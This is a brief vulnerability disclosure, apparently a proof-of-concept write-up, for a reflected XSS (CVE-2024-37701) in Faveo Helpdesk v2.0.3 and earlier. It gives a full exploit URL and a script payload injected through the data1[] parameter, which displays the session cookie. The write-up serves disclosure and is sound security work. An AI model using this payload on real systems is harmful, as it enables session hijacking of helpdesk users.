Use CVE-2024-37701


Vulnerability: Reflected XSS via data1[]

URL: ```https://192.168.124.130/get-merge-tickets/0?data1[]=10&data1[]=1'><script>alert(document.cookie)</script>```

Payload: ```'><script>alert(document.cookie)</script>```

Action to trigger: None

Note: The merge values need to be valid

Version: ‎Version v2.0.3 and prior

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter: data1[]


https://github.com/ladybirdweb/faveo-helpdesk


![](https://github.com/4rdr/proofs/blob/main/gifs/faveo-helpdesk_2.0.3_XSS_via_data1%5B%5D.gif)
